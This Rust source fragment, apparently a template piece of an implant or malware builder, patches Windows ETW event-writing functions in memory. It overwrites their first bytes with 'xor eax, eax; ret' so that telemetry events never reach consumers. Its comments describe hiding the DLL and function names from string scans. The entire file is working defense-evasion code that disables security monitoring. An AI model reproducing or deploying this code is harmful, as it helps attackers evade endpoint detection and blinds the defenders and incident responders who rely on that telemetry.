// --- ETW patch (technique fragment) ---

use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
};

/// `xor eax, eax; ret`: returns STATUS_SUCCESS (0) and never writes an event.
/// Written over the prologue of the event-writing exports.
const ETW_PATCH: [u8; 3] = [0x33, 0xC0, 0xC3];

/// Whether to also patch the Full variant (best effort).
const PATCH_FULL: bool = $PATCH_FULL$;

/// Errors produced while patching an event-writing function.
#[derive(Debug, thiserror::Error)]
pub enum PatchEtwError {
    #[error("failed to load the library to patch")]
    LoadFailed,
    #[error("failed to resolve the function to patch")]
    ResolveFailed,
    #[error("failed to make the target function writable")]
    MakeWritableFailed,
    #[error("failed to restore the target function protection")]
    RestoreProtectionFailed,
}

/// Patches the event-writing exports in the current process so no events reach
/// their consumers.
///
/// The main export failing aborts the preparation; the Full variant is best
/// effort, because some Windows builds do not export it and a missing secondary
/// export must not discard a working main patch.
///
/// The DLL and function names are substituted at build time by
/// `Params::render_fragment` with code that rebuilds them at runtime, so they
/// do not appear in `strings`.
pub fn patch_etw() -> Result<(), PatchEtwError> {
    patch_export(&$ETW_DLL_DEF$, &$ETW_FUNC_DEF$)?;
    if PATCH_FULL {
        let _ = patch_export(&$ETW_DLL_DEF$, &$ETW_FULL_FUNC_DEF$);
    }
    Ok(())
}

/// Resolves `func` in `dll` and overwrites its prologue with [`ETW_PATCH`].
fn patch_export(dll: &str, func: &str) -> Result<(), PatchEtwError> {
    let dll = std::ffi::CString::new(dll).map_err(|_| PatchEtwError::LoadFailed)?;
    let func = std::ffi::CString::new(func).map_err(|_| PatchEtwError::LoadFailed)?;

    // The library is already loaded, so this only fetches its handle.
    let module = unsafe { LoadLibraryA(PCSTR(dll.as_ptr() as *const u8)) }
        .map_err(|_| PatchEtwError::LoadFailed)?;
    let address = unsafe { GetProcAddress(module, PCSTR(func.as_ptr() as *const u8)) }
        .ok_or(PatchEtwError::ResolveFailed)?;
    let target = address as usize as *mut u8;

    // Make the first bytes writable.
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            target as *const core::ffi::c_void,
            ETW_PATCH.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    }
    .map_err(|_| PatchEtwError::MakeWritableFailed)?;

    // Write the patch.
    unsafe {
        for (i, byte) in ETW_PATCH.iter().enumerate() {
            *target.add(i) = *byte;
        }
    }

    // Restore the original protection.
    unsafe {
        VirtualProtect(
            target as *const core::ffi::c_void,
            ETW_PATCH.len(),
            old_protect,
            &mut old_protect,
        )
    }
    .map_err(|_| PatchEtwError::RestoreProtectionFailed)?;

    Ok(())
}
